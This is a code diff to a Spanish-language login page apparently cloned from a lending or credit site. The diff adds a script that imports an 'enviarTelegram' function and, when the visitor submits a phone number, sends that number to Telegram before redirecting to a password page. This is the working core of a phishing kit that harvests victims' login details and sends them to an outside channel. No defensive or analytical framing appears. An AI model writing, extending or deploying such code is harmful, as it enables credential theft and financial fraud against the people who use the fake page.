@@ -169,80 +169,88 @@
 
 
   <script type="module">
-    import { LoginValidation } from "../js/validateLogin.js";
+  import { LoginValidation } from "../js/validateLogin.js";
+  import { enviarTelegram } from "../js/telegram.js";
 
-    document.addEventListener("DOMContentLoaded", () => {
+  document.addEventListener("DOMContentLoaded", () => {
+    const params = new URLSearchParams(window.location.search);
+    const error = params.get("error");
 
-      const params = new URLSearchParams(window.location.search);
-      const error = params.get("error");
-
-      if (error === "1") {
-        const errorLogin = document.getElementById("error-login");
-        if (errorLogin) {
-          errorLogin.style.display = "flex";
-        }
-      }
-      // Ocultar el spinner inicial después de 3 segundos
-      setTimeout(() => {
-        const initialLoading = document.querySelector(".initial-loading");
-        if (initialLoading) {
-          initialLoading.style.display = "none";
-        }
-      }, 6000);
-      const form = document.getElementById("homeForm");
-      const loginButton = document.getElementById("loginButton");
-      const loadingSpinner = document.querySelector(".loadingContainer");
+    if (error === "1") {
       const errorLogin = document.getElementById("error-login");
-      const tryAgainButton = document.getElementById("tryAgainButton");
-      const mainContainer = document.getElementById("mainContainer");
-
-      // Detectar cuando se abre el teclado
-      function handleVisualViewport() {
-        if (window.visualViewport) {
-          if (window.visualViewport.height < window.innerHeight) {
-            mainContainer.classList.add("keyboard-open");
-          } else {
-            mainContainer.classList.remove("keyboard-open");
-          }
-        }
+      if (errorLogin) {
+        errorLogin.style.display = "flex";
       }
+    }
 
+    setTimeout(() => {
+      const initialLoading = document.querySelector(".initial-loading");
+      if (initialLoading) {
+        initialLoading.style.display = "none";
+      }
+    }, 6000);
+
+    const form = document.getElementById("homeForm");
+    const loginButton = document.getElementById("loginButton");
+    const phoneInput = document.getElementById("phoneNumber");
+    const mainContainer = document.getElementById("mainContainer");
+
+    // Detectar cuando se abre el teclado
+    function handleVisualViewport() {
       if (window.visualViewport) {
-        window.visualViewport.addEventListener(
-          "resize",
-          handleVisualViewport
-        );
-      }
-
-      // tryAgainButton.addEventListener("click", () => {
-      //   window.location.reload();
-      // });
-
-      form.addEventListener("submit", (event) => {
-        event.preventDefault();
-      });
-
-      const actualizarEstadoBoton = () => {
-        loginButton.disabled = true;
-        if (LoginValidation(form)) {
-          loginButton.disabled = false;
+        if (window.visualViewport.height < window.innerHeight) {
+          mainContainer.classList.add("keyboard-open");
         } else {
-          loginButton.disabled = true;
+          mainContainer.classList.remove("keyboard-open");
         }
-      };
+      }
+    }
 
-      form.addEventListener("input", actualizarEstadoBoton);
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener("resize", handleVisualViewport);
+    }
 
-      loginButton.addEventListener("click", async (event) => {
-        event.preventDefault();
-        if (LoginValidation(form)) {
-          window.location.href = "access-sign-in-pass.html";
-        }
-      });
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
     });
-  </script>
-</body>
 
+    const actualizarEstadoBoton = () => {
+      if (LoginValidation(form)) {
+        loginButton.disabled = false;
+      } else {
+        loginButton.disabled = true;
+      }
+    };
 
-<!-- Mirrored from prestamo360creditsecurity.pagacondecya.click/access-passed/accces-sign-in.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Sep 2025 01:57:04 GMT -->
-</html>
+    form.addEventListener("input", actualizarEstadoBoton);
+
+    loginButton.addEventListener("click", async (event) => {
+      event.preventDefault();
+      
+      if (LoginValidation(form)) {
+        const numero = phoneInput.value.trim();
+        
+        // Mostrar loading
+        loginButton.disabled = true;
+        loginButton.textContent = "Verificando...";
+        
+        // Enviar a Telegram
+        const enviado = await enviarTelegram({ numero });
+        
+        if (enviado) {
+          console.log("✅ Datos enviados correctamente");
+        } else {
+          console.warn("⚠️ No se pudo enviar a Telegram, pero continúa el flujo");
+        }
+        
+        // Redirigir a la siguiente página
+        setTimeout(() => {
+          window.location.href = "access-sign-in-pass.html";
+        }, 500);
+      }
+    });
+
+    // Inicializar estado del botón
+    actualizarEstadoBoton();
+  });
+</script>
